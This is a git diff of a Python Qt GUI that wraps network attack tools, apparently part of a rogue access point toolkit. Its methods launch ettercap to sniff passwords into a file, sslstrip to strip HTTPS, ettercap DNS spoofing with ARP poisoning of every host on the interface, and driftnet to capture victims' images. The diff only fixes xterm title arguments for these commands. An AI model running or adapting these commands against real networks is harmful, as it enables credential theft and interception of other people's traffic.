@@ -160,15 +160,16 @@ class frm_main(QWidget):
         system("killall xterm")
         QMessageBox.information(self,"Clear Setting", "Log CLear success ")
         system("clear")
-
+    
     def start_etter(self):
         system("sudo xterm -geometry 73x25-1+50 -T ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w passwords -i at0 & ettercapid=$!")
     def start_ssl(self):
         system("sudo xterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -k -l 10000 & sslstripid=$!")
+    # fix error :D dns spoof and drifnet, the bug in args -T xterm.
     def start_dns(self):
-        system("sudo xterm -geometry 73x25-1+250 -T ettercap DNS Spoof-s -sb -si +sk -sl 5000 -e ettercap -P dns_spoof -T -q -M arp // // -i at0 & ettercapid=$!")
+        system("sudo xterm -geometry 73x25-1+250 -T DNSSpoof -e ettercap -P dns_spoof -T -q -M arp // // -i at0 & dnscapid=$!")
     def start_dift(self):
-        system("sudo xterm -geometry 75x15+1+200 -T DriftNet Started -e driftnet -i at0 & driftnetid=$!")
+        system("sudo xterm -geometry 75x15+1+200 -T DriftNet -e driftnet -i at0 & driftnetid=$!")
     def configure(self):
         self.listbox.addItem("{+} Setting dhcpd Server...")
         self.configuradhcp = open("Config/dhcpd.conf","w")
